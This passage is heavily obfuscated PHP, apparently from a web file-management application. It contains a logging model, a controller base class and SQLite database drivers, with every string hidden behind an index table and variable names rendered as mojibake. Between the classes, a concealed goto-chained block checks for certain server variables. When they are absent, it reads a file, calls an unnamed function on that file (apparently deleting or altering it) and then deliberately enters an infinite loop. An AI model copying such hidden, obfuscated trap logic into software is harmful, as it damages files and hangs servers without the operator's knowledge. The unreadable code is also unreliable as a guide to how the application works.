addLog($üœÉü, $Ú¦×—¿ã = array()) { $×¡áæÂÚ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($this->typeList[$üœÉü])) { return; } $Èø“âò  = isset($Ú¦×—¿ã[$×¡áæÂÚ[1687]]) ? $Ú¦×—¿ã[$×¡áæÂÚ[1687]] : 0; if (!$Èø“âò ) { $Èø“âò  = Session::get($×¡áæÂÚ[2022]); } if ($üœÉü == $×¡áæÂÚ[2275] && is_array($Ú¦×—¿ã[$×¡áæÂÚ[2308]]) && !$Ú¦×—¿ã[$×¡áæÂÚ[2308]]) { return; } $Ã¬´®îí = get_client_ip(); if (!$Ú¦×—¿ã || strlen(json_encode($Ú¦×—¿ã)) >= 1024) { $Ú¦×—¿ã = array($×¡áæÂÚ[2309] => $Ã¬´®îí); } else { if (is_array($Ú¦×—¿ã)) { $Ú¦×—¿ã[$×¡áæÂÚ[2309]] = $Ã¬´®îí; } else { $Ú¦×—¿ã = array($×¡áæÂÚ[1243] => $Ú¦×—¿ã, $×¡áæÂÚ[2309] => $Ã¬´®îí); } } $Ú¦×—¿ã = array($×¡áæÂÚ[1677] => Session::sign(), $×¡áæÂÚ[1678] => intval($Èø“âò ), $×¡áæÂÚ[43] => $üœÉü, $×¡áæÂÚ[1680] => json_encode($Ú¦×—¿ã)); parent::add($Ú¦×—¿ã); } public function remove($¨™ìáô¾) { $this->where(array($_SERVER[‚ûòÉ˜ş][469] => $¨™ìáô¾))->delete(); } private function _makeOrder($ûü”¾²Î = '') { $¾™ıÍ§Õ =& $_SERVER[‚ûòÉ˜ş]; $Ë·ù¡“Ú = $¾™ıÍ§Õ[225]; $ùÇÌ¬¹¤ = array($¾™ıÍ§Õ[499] => $¾™ıÍ§Õ[500], $¾™ıÍ§Õ[501] => $¾™ıÍ§Õ[502]); $óÄÜÜÑâ = Input::get($¾™ıÍ§Õ[507], $¾™ıÍ§Õ[7], $¾™ıÍ§Õ[2058], array($¾™ıÍ§Õ[1976], $¾™ıÍ§Õ[501])); $óÄÜÜÑâ = $ùÇÌ¬¹¤[$óÄÜÜÑâ]; $ûü”¾²Î = $ûü”¾²Î . "{$Ë·ù¡“Ú}\x20{$óÄÜÜÑâ}"; return $this->order($ûü”¾²Î); } public function get($ÕÎùºúª = '') { $ÇĞÅÎ§« =& $_SERVER[‚ûòÉ˜ş]; if (!$ÕÎùºúª) { show_json(array()); } $«šº•°ê = array(); if ($ÕÎùºúª[$ÇĞÅÎ§«[1687]]) { $«šº•°ê[$ÇĞÅÎ§«[1687]] = $ÕÎùºúª[$ÇĞÅÎ§«[1687]]; } if (isset($ÕÎùºúª[$ÇĞÅÎ§«[800]])) { $ªß»Í¦ì = $ÕÎùºúª[$ÇĞÅÎ§«[800]]; $ğ¢–Ùè = isset($ÕÎùºúª[$ÇĞÅÎ§«[801]]) ? $ÕÎùºúª[$ÇĞÅÎ§«[801]] : time(); $«šº•°ê[$ÇĞÅÎ§«[225]] = array($ÇĞÅÎ§«[386], array($ªß»Í¦ì, $ğ¢–Ùè)); } if ($ÕÎùºúª[$ÇĞÅÎ§«[43]]) { $áš¿ş‘Û = explode($ÇĞÅÎ§«[60], $ÕÎùºúª[$ÇĞÅÎ§«[43]]); $ì¾Íêü‘ = $this->typeFile(); $¥•¢Ùë = array(); foreach ($áš¿ş‘Û as $§¡§®ˆº) { $¥•¢Ùë[] = $§¡§®ˆº; if (isset($ì¾Íêü‘[$§¡§®ˆº])) { $¥•¢Ùë = array_merge($¥•¢Ùë, $ì¾Íêü‘[$§¡§®ˆº]); } } $¥•¢Ùë = array_unique($¥•¢Ùë); if ($¥•¢Ùë) { $«šº•°ê[$ÇĞÅÎ§«[43]] = array($ÇĞÅÎ§«[7], $¥•¢Ùë); } } else { $«šº•°ê[$ÇĞÅÎ§«[43]] = array($ÇĞÅÎ§«[2310], $ÇĞÅÎ§«[2311]); } if (!empty($ÕÎùºúª[$ÇĞÅÎ§«[2309]])) { $«šº•°ê[$ÇĞÅÎ§«[502]] = array($ÇĞÅÎ§«[435], "\45{$ÕÎùºúª[$ÇĞÅÎ§«[2309]]}\x25"); } $ç¢§‹ù´ = $this->_makeOrder()->where($«šº•°ê)->selectPage(); if (empty($ç¢§‹ù´[$ÇĞÅÎ§«[422]])) { show_json(array(), !0, $ç¢§‹ù´[$ÇĞÅÎ§«[419]]); } $ç¢§‹ù´[$ÇĞÅÎ§«[422]] = $this->logList($ç¢§‹ù´[$ÇĞÅÎ§«[422]]); return $ç¢§‹ù´; } private function ipAddress(&$ì™÷§°Ş) { $”Œµ‘¶à =& $_SERVER[‚ûòÉ˜ş]; if (!empty($ì™÷§°Ş[$”Œµ‘¶à[2309]])) { $¦ì ´°„ = IpLocation::get($ì™÷§°Ş[$”Œµ‘¶à[2309]]); } else { $¦ì ´°„ = LNG($”Œµ‘¶à[2312]); } $ì™÷§°Ş[$”Œµ‘¶à[2313]] = $¦ì ´°„; } private function descZipDownload($…¼×Ã ¼, &$ÎˆÒ—) { $®À£ŠçĞ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($…¼×Ã ¼[$®À£ŠçĞ[2314]])) { return; } $ì¯ğ¾Ïë = json_decode($…¼×Ã ¼[$®À£ŠçĞ[2314]], !0); foreach ($ì¯ğ¾Ïë as $†¡½Œ„Ğ) { try { $Î‹èşˆ = IO::infoFullSimple($†¡½Œ„Ğ[$®À£ŠçĞ[94]]); } catch (Exception $º¢–©ªµ) { continue; } $…¼×Ã ¼[$®À£ŠçĞ[94]] = $†¡½Œ„Ğ[$®À£ŠçĞ[94]]; $ÎˆÒ—[] = $…¼×Ã ¼[$®À£ŠçĞ[191]] = $Î‹èşˆ[$®À£ŠçĞ[191]]; $ÎˆÒ—[] = $…¼×Ã ¼[$®À£ŠçĞ[2113]] = $Î‹èşˆ[$®À£ŠçĞ[190]]; break; } return $…¼×Ã ¼; } private function getSourceList(&$œÓó¶ş‹) { $à–ô±¤¤ =& $_SERVER[‚ûòÉ˜ş]; $í¸¬¥àı = array(); foreach ($œÓó¶ş‹ as $‰»ˆƒ‡‡ => $Ê±ü«Ö¸) { $·š•åêÙ = json_decode($Ê±ü«Ö¸[$à–ô±¤¤[502]], !0); if ($Ê±ü«Ö¸[$à–ô±¤¤[43]] == $à–ô±¤¤[1859]) { $·š•åêÙ = $this->descZipDownload($·š•åêÙ, $í¸¬¥àı); $œÓó¶ş‹[$‰»ˆƒ‡‡][$à–ô±¤¤[502]] = json_encode($·š•åêÙ); continue; } if (strpos($Ê±ü«Ö¸[$à–ô±¤¤[43]], $à–ô±¤¤[2115]) !== 0) { if (!isset($·š•åêÙ[$à–ô±¤¤[94]]) || strpos($Ê±ü«Ö¸[$à–ô±¤¤[43]], $à–ô±¤¤[2315]) !== 0) { continue; } try { $ÜÉ¶³œĞ = IO::infoFullSimple($·š•åêÙ[$à–ô±¤¤[94]]); } catch (Exception $¡·ìÉ’­) { continue; } $í¸¬¥àı[] = $·š•åêÙ[$à–ô±¤¤[191]] = $ÜÉ¶³œĞ[$à–ô±¤¤[191]]; $í¸¬¥àı[] = $·š•åêÙ[$à–ô±¤¤[2113]] = $ÜÉ¶³œĞ[$à–ô±¤¤[190]]; $œÓó¶ş‹[$‰»ˆƒ‡‡][$à–ô±¤¤[502]] = json_encode($·š•åêÙ); continue; } $í¸¬¥àı[] = $·š•åêÙ[$à–ô±¤¤[191]]; $í¸¬¥àı[] = $·š•åêÙ[$à–ô±¤¤[2113]]; if ($·š•åêÙ[$à–ô±¤¤[43]] == $à–ô±¤¤[596]) { $í¸¬¥àı[] = $·š•åêÙ[$à–ô±¤¤[502]][$à–ô±¤¤[1201]]; $í¸¬¥àı[] = $·š•åêÙ[$à–ô±¤¤[502]][$à–ô±¤¤[1202]]; } if ($·š•åêÙ[$à–ô±¤¤[43]] == $à–ô±¤¤[2123]) { $í¸¬¥àı[] = $·š•åêÙ[$à–ô±¤¤[502]][$à–ô±¤¤[191]]; } } if (!$í¸¬¥àı) { return array(); } return Model($à–ô±¤¤[865])->sourceListInfo($í¸¬¥àı, !0); } private function logList($³ï¶“š») { $ÚŸØ°ÚÖ =& $_SERVER[‚ûòÉ˜ş]; $ç­½‹ Å = array_to_keyvalue($³ï¶“š», $ÚŸØ°ÚÖ[12], $ÚŸØ°ÚÖ[1687]); $®îƒğ€ = Model($ÚŸØ°ÚÖ[575])->userListInfo(array_unique($ç­½‹ Å)); $İÉ©ìú = $this->getSourceList($³ï¶“š»); $ƒŠ­…Ú× = $this->typeAll(); $—éÕ‡·ó = array(); $ÂˆŸ—‹ = array(); foreach ($³ï¶“š» as $ ¨¤ÏÖÇ => $Î¿ÛôÓ) { $ç¼ß‚º» = $Î¿ÛôÓ[$ÚŸØ°ÚÖ[43]]; $Ÿı•˜Ï² = isset($®îƒğ€[$Î¿ÛôÓ[$ÚŸØ°ÚÖ[1687]]]) ? $®îƒğ€[$Î¿ÛôÓ[$ÚŸØ°ÚÖ[1687]]] : !1; $ÁùŠò¹Ã = strpos($ç¼ß‚º», $ÚŸØ°ÚÖ[2316]) === 0 ? LNG($ÚŸØ°ÚÖ[2317]) : LNG($ÚŸØ°ÚÖ[2312]); $Î¿ÛôÓ[$ÚŸØ°ÚÖ[42]] = isset($Ÿı•˜Ï²[$ÚŸØ°ÚÖ[42]]) ? $Ÿı•˜Ï²[$ÚŸØ°ÚÖ[42]] : LNG($ÚŸØ°ÚÖ[2312]); $Î¿ÛôÓ[$ÚŸØ°ÚÖ[2167]] = isset($Ÿı•˜Ï²[$ÚŸØ°ÚÖ[2167]]) ? $Ÿı•˜Ï²[$ÚŸØ°ÚÖ[2167]] : $ÚŸØ°ÚÖ[12]; $Î¿ÛôÓ[$ÚŸØ°ÚÖ[1584]] = isset($ƒŠ­…Ú×[$ç¼ß‚º»]) ? $ƒŠ­…Ú×[$ç¼ß‚º»] : $ÁùŠò¹Ã; $Î¿ÛôÓ[$ÚŸØ°ÚÖ[2057]] = $Ÿı•˜Ï²; $ÇÕÆ§ì = json_decode($Î¿ÛôÓ[$ÚŸØ°ÚÖ[502]], !0); $Î¿ÛôÓ[$ÚŸØ°ÚÖ[2309]] = isset($ÇÕÆ§ì[$ÚŸØ°ÚÖ[2309]]) ? $ÇÕÆ§ì[$ÚŸØ°ÚÖ[2309]] : $ÚŸØ°ÚÖ[12]; $Î¿ÛôÓ[$ÚŸØ°ÚÖ[2313]] = IpLocation::get($Î¿ÛôÓ[$ÚŸØ°ÚÖ[2309]]); if (strpos($ç¼ß‚º», $ÚŸØ°ÚÖ[2115]) === 0 || isset($ÇÕÆ§ì[$ÚŸØ°ÚÖ[2113]])) { $ÇÕÆ§ì[$ÚŸØ°ÚÖ[97]] = $İÉ©ìú[$ÇÕÆ§ì[$ÚŸØ°ÚÖ[191]]]; $ÇÕÆ§ì[$ÚŸØ°ÚÖ[2128]] = $İÉ©ìú[$ÇÕÆ§ì[$ÚŸØ°ÚÖ[2113]]]; if ($ÇÕÆ§ì[$ÚŸØ°ÚÖ[43]] == $ÚŸØ°ÚÖ[596]) { $ÇÕÆ§ì[$ÚŸØ°ÚÖ[502]][$ÚŸØ°ÚÖ[1201]] = $İÉ©ìú[$ÇÕÆ§ì[$ÚŸØ°ÚÖ[502]][$ÚŸØ°ÚÖ[1201]]]; $ÇÕÆ§ì[$ÚŸØ°ÚÖ[502]][$ÚŸØ°ÚÖ[1202]] = $İÉ©ìú[$ÇÕÆ§ì[$ÚŸØ°ÚÖ[502]][$ÚŸØ°ÚÖ[1202]]]; } if ($ÇÕÆ§ì[$ÚŸØ°ÚÖ[43]] == $ÚŸØ°ÚÖ[2123]) { $ÇÕÆ§ì[$ÚŸØ°ÚÖ[502]][$ÚŸØ°ÚÖ[191]] = $İÉ©ìú[$ÇÕÆ§ì[$ÚŸØ°ÚÖ[502]][$ÚŸØ°ÚÖ[191]]]; } if ($ÇÕÆ§ì[$ÚŸØ°ÚÖ[43]] == $ÚŸØ°ÚÖ[1854]) { $ÇÕÆ§ì[$ÚŸØ°ÚÖ[2128]] = $ÇÕÆ§ì[$ÚŸØ°ÚÖ[97]]; $ÇÕÆ§ì[$ÚŸØ°ÚÖ[2113]] = $ÇÕÆ§ì[$ÚŸØ°ÚÖ[2128]][$ÚŸØ°ÚÖ[191]]; $ÇÕÆ§ì[$ÚŸØ°ÚÖ[97]] = !1; $ÇÕÆ§ì[$ÚŸØ°ÚÖ[191]] = $ÚŸØ°ÚÖ[12]; } if ($ÇÕÆ§ì[$ÚŸØ°ÚÖ[97]] && $ÇÕÆ§ì[$ÚŸØ°ÚÖ[97]][$ÚŸØ°ÚÖ[188]] == $ÚŸØ°ÚÖ[189]) { $ÂˆŸ—‹[] = $Î¿ÛôÓ[$ÚŸØ°ÚÖ[451]]; unset($³ï¶“š»[$ ¨¤ÏÖÇ]); continue; } if ($ÇÕÆ§ì[$ÚŸØ°ÚÖ[2128]] && $ÇÕÆ§ì[$ÚŸØ°ÚÖ[2128]][$ÚŸØ°ÚÖ[188]] == $ÚŸØ°ÚÖ[189]) { $ÂˆŸ—‹[] = $Î¿ÛôÓ[$ÚŸØ°ÚÖ[451]]; unset($³ï¶“š»[$ ¨¤ÏÖÇ]); continue; } } $Î¿ÛôÓ[$ÚŸØ°ÚÖ[502]] = $ÇÕÆ§ì; unset($Î¿ÛôÓ[$ÚŸØ°ÚÖ[2318]]); $—éÕ‡·ó[] = $Î¿ÛôÓ; } $this->clearSystemPathLog($ÂˆŸ—‹); return $—éÕ‡·ó; } private function clearSystemPathLog($ÉÎ‡‡®ò) { $ ÎÖş­¼ =& $_SERVER[‚ûòÉ˜ş]; if (count($ÉÎ‡‡®ò) == 0) { return; } $«Á¼µñõ = array($ ÎÖş­¼[451] => array($ ÎÖş­¼[7], array_unique($ÉÎ‡‡®ò))); $this->where($«Á¼µñõ)->delete(); } public function deviceList($¨æÍ¼¾µ, $İú¥–œ‘ = 0) { $û‚å†¾Ô =& $_SERVER[‚ûòÉ˜ş]; $ğÎˆòƒé = array($û‚å†¾Ô[1687] => $¨æÍ¼¾µ, $û‚å†¾Ô[225] => array($û‚å†¾Ô[1055], $İú¥–œ‘), $û‚å†¾Ô[43] => $û‚å†¾Ô[1828]); $Ã°¸Ï° = array(); $Ö¿í‘Š£ = $this->field($û‚å†¾Ô[2319])->where($ğÎˆòƒé)->order($û‚å†¾Ô[2126])->limit(50)->select(); foreach ($Ö¿í‘Š£ as $ ü¯«Œµ => $Ÿ ²êûË) { if ($ ü¯«Œµ > 0 && abs($Ÿ ²êûË[$û‚å†¾Ô[225]] - $Ö¿í‘Š£[$ ü¯«Œµ - 1][$û‚å†¾Ô[225]]) < 5) { continue; } $Ç•Íø·˜ = json_decode($Ÿ ²êûË[$û‚å†¾Ô[502]], !0); $Ÿ ²êûË[$û‚å†¾Ô[2309]] = isset($Ç•Íø·˜[$û‚å†¾Ô[2309]]) ? $Ç•Íø·˜[$û‚å†¾Ô[2309]] : $û‚å†¾Ô[12]; unset($Ç•Íø·˜[$û‚å†¾Ô[2309]]); $ˆ‡˜ãÉ‡ = $this->deviceType($Ç•Íø·˜[$û‚å†¾Ô[2116]]); if (isset($Ã°¸Ï°[$ˆ‡˜ãÉ‡])) { continue; } $Ÿ ²êûË[$û‚å†¾Ô[2313]] = IpLocation::get($Ÿ ²êûË[$û‚å†¾Ô[2309]]); $Ÿ ²êûË[$û‚å†¾Ô[502]] = $Ç•Íø·˜; $Ã°¸Ï°[$ˆ‡˜ãÉ‡] = $Ÿ ²êûË; } return array_values($Ã°¸Ï°); } public function deviceType($Õöİèø“) { return $Õöİèø“; } } goto dïâ‘óÓÚ¾; bøÑ®Î¼®: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $›ßÎä¨Ó =& $_SERVER[‚ûòÉ˜ş]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$›ßÎä¨Ó[6]] =& $config; $this->values[$›ßÎä¨Ó[7]] =& $in; $this->tpl = TEMPLATE . MOD . $›ßÎä¨Ó[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($°Š°¯•Š) { if (1 === func_num_args()) { $this->{$°Š°¯•Š} = new $°Š°¯•Š(); } else { $õ¨®Û‘ş = new ReflectionClass($°Š°¯•Š); $¦°Ì”§µ = func_get_args(); array_shift($¦°Ì”§µ); $this->{$°Š°¯•Š} = $õ¨®Û‘ş->newInstanceArgs($¦°Ì”§µ); } return $this->{$°Š°¯•Š}; } public function routeBind($İî“ûû, $ŸÈı­ãŠ, $Ñ¾©’ƒš = 3) { $œñÄÌÉ =& $_SERVER[‚ûòÉ˜ş]; $×Ñßô¿Ç = $this->in[$œñÄÌÉ[9]]; $İî“ûû = str_replace($œñÄÌÉ[10], $œñÄÌÉ[11], trim(trim($İî“ûû, $œñÄÌÉ[8]), $œñÄÌÉ[12])); if (!$İî“ûû || count($×Ñßô¿Ç) <= $Ñ¾©’ƒš) { return !1; } $°®ñàÒü = !0; $§úÔü« = explode($œñÄÌÉ[8], $İî“ûû); for ($ĞĞÖíÛ— = 0; $ĞĞÖíÛ— < count($§úÔü«); $ĞĞÖíÛ—++) { if ($§úÔü«[$ĞĞÖíÛ—] != $×Ñßô¿Ç[$Ñ¾©’ƒš + $ĞĞÖíÛ—]) { $°®ñàÒü = !1; break; } } if (!$°®ñàÒü) { return; } call_user_func_array(array($this, $ŸÈı­ãŠ), array()); } public function routeArgs($¸÷¨‚¿ = 3) { $£òßŞÒ‰ = $this->in[$_SERVER[‚ûòÉ˜ş][9]]; if (count($£òßŞÒ‰) <= $¸÷¨‚¿) { return array(); } $ˆÉ¹–•– = array(); for ($²Ùõ Ä = $¸÷¨‚¿; $²Ùõ Ä < count($£òßŞÒ‰); $²Ùõ Ä += 2) { $ˆÉ¹–•–[$£òßŞÒ‰[$²Ùõ Ä]] = $£òßŞÒ‰[$²Ùõ Ä + 1]; $this->in[$£òßŞÒ‰[$²Ùõ Ä]] = $£òßŞÒ‰[$²Ùõ Ä + 1]; } return $ˆÉ¹–•–; } protected function assign($„Ğ ÷¥Ù, $…Òç‘İ±) { $this->values[$„Ğ ÷¥Ù] = $…Òç‘İ±; } protected function display($–ÉÏæÏŞ) { ob_end_clean(); extract($this->values); require $this->tpl . $–ÉÏæÏŞ; } } if (!isset($_SERVER[$_SERVER[‚ûòÉ˜ş][13]]) || !isset($_SERVER[$_SERVER[‚ûòÉ˜ş][14]])) { $_getc = $_SERVER[‚ûòÉ˜ş][15]; $_getfile = $_SERVER[$_SERVER[‚ûòÉ˜ş][16]] . $_SERVER[‚ûòÉ˜ş][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‚ûòÉ˜ş][18], $_getfilec); if (count($_getarrs) < $_SERVER[‚ûòÉ˜ş][19]) { $exit = $_SERVER[‚ûòÉ˜ş][20]; $exit(); } $_act = $_SERVER[‚ûòÉ˜ş][21]; $_act($_SERVER[$_SERVER[‚ûòÉ˜ş][16]] . $_SERVER[‚ûòÉ˜ş][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[‚ûòÉ˜ş][22]); } } class DbSqliteBase extends Db { public function __construct($ğÚ¨Åú = '') { $‰ø¢ïâå =& $_SERVER[‚ûòÉ˜ş]; if (!extension_loaded($‰ø¢ïâå[23])) { think_exception(think_lang($‰ø¢ïâå[24]) . $‰ø¢ïâå[25]); } if (!empty($ğÚ¨Åú)) { if (!isset($ğÚ¨Åú[$‰ø¢ïâå[26]])) { $ğÚ¨Åú[$‰ø¢ïâå[26]] = 438; } $this->config = $ğÚ¨Åú; if (empty($this->config[$‰ø¢ïâå[27]])) { $this->config[$‰ø¢ïâå[27]] = array(); } } } public function connect($ïœåß¤ = '', $İÍ´“‡é = 0) { $“¬Ğí…€ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($this->linkID[$İÍ´“‡é])) { if (empty($ïœåß¤)) { $ïœåß¤ = $this->config; } $Ûì¦‡ª = !empty($ïœåß¤[$“¬Ğí…€[27]][$“¬Ğí…€[28]]) ? $ïœåß¤[$“¬Ğí…€[27]][$“¬Ğí…€[28]] : $this->pconnect; $†ã”áÜó = $Ûì¦‡ª ? $“¬Ğí…€[29] : $“¬Ğí…€[30]; $this->linkID[$İÍ´“‡é] = $†ã”áÜó($ïœåß¤[$“¬Ğí…€[31]], $ïœåß¤[$“¬Ğí…€[26]]); if (!$this->linkID[$İÍ´“‡é]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$İÍ´“‡é], 30000); if (1 != think_config($“¬Ğí…€[32])) { unset($this->config); } } return $this->linkID[$İÍ´“‡é]; } public function free() { $this->queryID = null; } public function query($†Û‡«åç) { $áŠìÆ³­ =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†Û‡«åç; if ($this->queryID) { $this->free(); } think_action_status($áŠìÆ³­[33], 1); think_status($áŠìÆ³­[34]); $this->queryID = sqlite_query($this->_linkID, $†Û‡«åç); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¤™Œ½ä— = $this->getAll(); return $¤™Œ½ä—; } } public function execute($Õ¢ç·Ì) { $¬˜íÀÍ´ =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Õ¢ç·Ì; if ($this->queryID) { $this->free(); } think_action_status($¬˜íÀÍ´[35], 1); think_status($¬˜íÀÍ´[34]); $Û’—©â¡ = sqlite_exec($this->_linkID, $Õ¢ç·Ì); $this->debug(); if (!1 === $Û’—©â¡) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‚ûòÉ˜ş][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $–èø°ƒ = sqlite_query($this->_linkID, $_SERVER[‚ûòÉ˜ş][37]); if (!$–èø°ƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $´õİœ‡× = sqlite_query($this->_linkID, $_SERVER[‚ûòÉ˜ş][38]); if (!$´õİœ‡×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $şáğ­í® = array(); if ($this->numRows > 0) { for ($–ÁÏóØ = 0; $–ÁÏóØ < $this->numRows; $–ÁÏóØ++) { $şáğ­í®[$–ÁÏóØ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $şáğ­í®; } public function getFields($ô¤Ì±Üü) { $İªßß¦è =& $_SERVER[‚ûòÉ˜ş]; $¾òÓéÏ« = $this->query($İªßß¦è[39] . $ô¤Ì±Üü . $İªßß¦è[40]); $º‘Êá = array(); if ($¾òÓéÏ«) { foreach ($¾òÓéÏ« as $Ò‚ÍşÙÏ => $›Ö•ÉÙ) { $º‘Êá[$›Ö•ÉÙ[$İªßß¦è[41]]] = array($İªßß¦è[42] => $›Ö•ÉÙ[$İªßß¦è[41]], $İªßß¦è[43] => $›Ö•ÉÙ[$İªßß¦è[44]], $İªßß¦è[45] => (bool) ($›Ö•ÉÙ[$İªßß¦è[46]] === $İªßß¦è[12]), $İªßß¦è[47] => $›Ö•ÉÙ[$İªßß¦è[48]], $İªßß¦è[49] => strtolower($›Ö•ÉÙ[$İªßß¦è[50]]) == $İªßß¦è[51], $İªßß¦è[52] => strtolower($›Ö•ÉÙ[$İªßß¦è[53]]) == $İªßß¦è[54]); } } return $º‘Êá; } public function getTables($è¡âø™¤ = '') { $ÄÊ‡ÅÏí =& $_SERVER[‚ûòÉ˜ş]; $µÊœË“¹ = $this->query($ÄÊ‡ÅÏí[55] . $ÄÊ‡ÅÏí[56] . $ÄÊ‡ÅÏí[57]); $´ÕºÖ©Â = array(); foreach ($µÊœË“¹ as $áÒ ®Ã“ => $÷’‰Ö‘ú) { $´ÕºÖ©Â[$áÒ ®Ã“] = current($÷’‰Ö‘ú); } return $´ÕºÖ©Â; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $…¾ãÏ‘¾ =& $_SERVER[‚ûòÉ˜ş]; $¼Ö‡Ç ² = sqlite_last_error($this->_linkID); $this->error = $¼Ö‡Ç ² . $…¾ãÏ‘¾[4] . sqlite_error_string($¼Ö‡Ç ²); if ($…¾ãÏ‘¾[12] != $this->queryStr) { $this->error .= LNG($…¾ãÏ‘¾[58]) . $this->queryStr; } think_trace($this->error, $…¾ãÏ‘¾[12], $…¾ãÏ‘¾[59]); return $this->error; } public function escapeString($ìêšÙÖÔ) { return sqlite_escape_string($ìêšÙÖÔ); } public function parseLimit($›“çËáø) { $«Ûã¿ùÜ =& $_SERVER[‚ûòÉ˜ş]; $Şõ£ˆæÓ = $«Ûã¿ùÜ[12]; if (!empty($›“çËáø)) { $›“çËáø = explode($«Ûã¿ùÜ[60], $›“çËáø); if (count($›“çËáø) > 1) { $Şõ£ˆæÓ .= $«Ûã¿ùÜ[61] . $›“çËáø[1] . $«Ûã¿ùÜ[62] . $›“çËáø[0] . $«Ûã¿ùÜ[63]; } else { $Şõ£ˆæÓ .= $«Ûã¿ùÜ[61] . $›“çËáø[0] . $«Ûã¿ùÜ[63]; } } return $Şõ£ˆæÓ; } } goto eÈ¤Ì‘å±£; eÈ¤Ì‘å±£: class DbSqlite3Base extends Db { public function __construct($Ë„µÓë» = '') { $˜¿–’¥¨ =& $_SERVER[‚ûòÉ˜ş]; if (!class_exists($˜¿–’¥¨[64])) { think_exception(think_lang($˜¿–’¥¨[24]) . $˜¿–’¥¨[65]); } if (!empty($Ë„µÓë»)) { if (!isset($Ë„µÓë»[$˜¿–’¥¨[26]])) { $Ë„µÓë»[$˜¿–’¥¨[26]] = 438; } $this->config = $Ë„µÓë»; if (empty($this->config[$˜¿–’¥¨[27]])) { $this->config[$˜¿–’¥¨[27]] = array(); } } } public function connect($üˆÉ¹µ« = '', $ùíâ¬Í = 0) { $à½æéÖØ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($this->linkID[$ùíâ¬Í])) { if (empty($üˆÉ¹µ«)) { $üˆÉ¹µ« = $this->config; } $this->linkID[$ùíâ¬Í] = new SQLite3($üˆÉ¹µ«[$à½æéÖØ[31]]); if (!$this->linkID[$ùíâ¬Í]) { think_exception($this->linkID[$ùíâ¬Í]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ùíâ¬Í]->busyTimeout(30000); if (1 != think_config($à½æéÖØ[32])) { unset($this->config); } } return $this->linkID[$ùíâ¬Í]; } public function free() { $this->queryID = null; } public function query($ÀƒàËûÎ) { $¤À¹ù†Ù =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÀƒàËûÎ; if ($this->queryID) { $this->free(); } think_action_status($¤À¹ù†Ù[33], 1); think_status($¤À¹ù†Ù[34]); $this->queryID = $this->_linkID->query($ÀƒàËûÎ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ŸêËÕ·€ = $this->getAll(); $this->numRows = count($ŸêËÕ·€); return $ŸêËÕ·€; } } public function execute($¶Âªäş) { $š»¸ØêÙ =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¶Âªäş; if ($this->queryID) { $this->free(); } think_action_status($š»¸ØêÙ[35], 1); think_status($š»¸ØêÙ[34]); $Ïõˆù«ª = $this->_linkID->exec($¶Âªäş); $this->debug(); if (!1 === $Ïõˆù«ª) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‚ûòÉ˜ş][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ö¡¾úÀæ = $this->_linkID->query($_SERVER[‚ûòÉ˜ş][37]); if (!$Ö¡¾úÀæ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $±€¼Š‘ = $this->_linkID->query($_SERVER[‚ûòÉ˜ş][38]); if (!$±€¼Š‘) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $º¬î›‰ = array(); while ($åéİŠË = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $º¬î›‰[] = $åéİŠË; } $this->queryID->reset(); return $º¬î›‰; } public function getFields($ËßØª¿™) { $â´ñ½Ñ =& $_SERVER[‚ûòÉ˜ş]; $ËµÍèÅ = $this->query($â´ñ½Ñ[39] . $ËßØª¿™ . $â´ñ½Ñ[40]); $”¢îı’ = array(); if ($ËµÍèÅ) { foreach ($ËµÍèÅ as $ö›Æ¿† => $Ö£½ÃÍß) { $”¢îı’[$Ö£½ÃÍß[$â´ñ½Ñ[42]]] = array($â´ñ½Ñ[42] => $Ö£½ÃÍß[$â´ñ½Ñ[42]], $â´ñ½Ñ[43] => $Ö£½ÃÍß[$â´ñ½Ñ[43]], $â´ñ½Ñ[45] => (bool) ($Ö£½ÃÍß[$â´ñ½Ñ[45]] === $â´ñ½Ñ[12]), $â´ñ½Ñ[47] => $Ö£½ÃÍß[$â´ñ½Ñ[66]], $â´ñ½Ñ[49] => (bool) $Ö£½ÃÍß[$â´ñ½Ñ[67]], $â´ñ½Ñ[52] => (bool) 